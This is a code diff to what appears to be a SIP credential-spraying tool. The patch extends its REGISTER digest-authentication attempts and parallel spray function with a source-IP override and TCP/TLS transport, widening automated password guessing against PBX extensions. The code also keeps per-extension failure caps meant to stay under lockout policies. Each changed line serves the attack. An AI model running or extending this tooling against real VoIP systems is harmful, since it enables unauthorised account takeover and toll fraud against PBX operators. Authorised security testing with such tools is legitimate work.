@@ -40,10 +40,16 @@ def _try_register(
     host: str, ext: str, username: str, password: str,
     port: int = 5060, local_ip: str | None = None,
     timeout: float = 3.0, traffic_log=None,
+    source_ip: str = "",
+    tcp: bool = False,
+    use_tls: bool = False,
 ) -> tuple[bool, str]:
     """Return (success, evidence). Success = 200 OK after digest auth."""
     if not local_ip:
-        local_ip = local_ip_for(host)
+        local_ip = source_ip if source_ip else local_ip_for(host)
+    if use_tls:
+        tcp = True
+    transport = "TLS" if use_tls else ("TCP" if tcp else "UDP")
     uri = f"sip:{host}"
     call_id = rand_call_id()
     tag = rand_tag()
@@ -55,9 +61,14 @@ def _try_register(
         host=host, port=port, local_ip=local_ip, local_port=0,
         call_id=call_id, cseq=1, from_tag=tag,
         extra_headers=["Expires: 30"],
+        transport=transport,
     )
-    data1 = sip.send_and_recv(msg1, host, port, 0, timeout,
-                               traffic_log=traffic_log)
+    if tcp:
+        data1 = sip.send_and_recv_tcp(msg1, host, port, timeout=timeout,
+                                       use_tls=use_tls, traffic_log=traffic_log)
+    else:
+        data1 = sip.send_and_recv(msg1, host, port, 0, timeout,
+                                   traffic_log=traffic_log)
     if not data1:
         return False, "no response to REGISTER"
     resp1 = sip.parse_response(data1)
@@ -88,9 +99,14 @@ def _try_register(
         call_id=call_id, cseq=2, from_tag=tag,
         auth_header=auth_header,
         extra_headers=["Expires: 30"],
+        transport=transport,
     )
-    data2 = sip.send_and_recv(msg2, host, port, 0, timeout,
-                               traffic_log=traffic_log)
+    if tcp:
+        data2 = sip.send_and_recv_tcp(msg2, host, port, timeout=timeout,
+                                       use_tls=use_tls, traffic_log=traffic_log)
+    else:
+        data2 = sip.send_and_recv(msg2, host, port, 0, timeout,
+                                   traffic_log=traffic_log)
     if not data2:
         return False, "no response to authed REGISTER"
     resp2 = sip.parse_response(data2)
@@ -112,6 +128,9 @@ def spray(
     stop_on_first: bool = True,
     smart_self_password: bool = True,
     max_failures_per_ext: int = 5,
+    source_ip: str = "",
+    tcp: bool = False,
+    use_tls: bool = False,
 ) -> list[CredHit]:
     """Spray creds across extensions in parallel.
 
@@ -121,7 +140,7 @@ def spray(
                           many failures, to avoid triggering PBX lockout policies.
                           Set to 0 to disable (not recommended on prod targets).
     """
-    local_ip = local_ip_for(host)
+    local_ip = source_ip if source_ip else local_ip_for(host)
     results: list[CredHit] = []
     results_lock = threading.Lock()
     stop_for_ext: dict[str, threading.Event] = {e: threading.Event() for e in extensions}
@@ -149,7 +168,8 @@ def spray(
         if stop_for_ext[ext].is_set():
             return None
         ok, ev = _try_register(host, ext, u, p, port=port, local_ip=local_ip,
-                                timeout=timeout, traffic_log=traffic_log)
+                                timeout=timeout, traffic_log=traffic_log,
+                                tcp=tcp, use_tls=use_tls)
         return CredHit(ext, u, p, ok, ev)
 
     # Build the work list
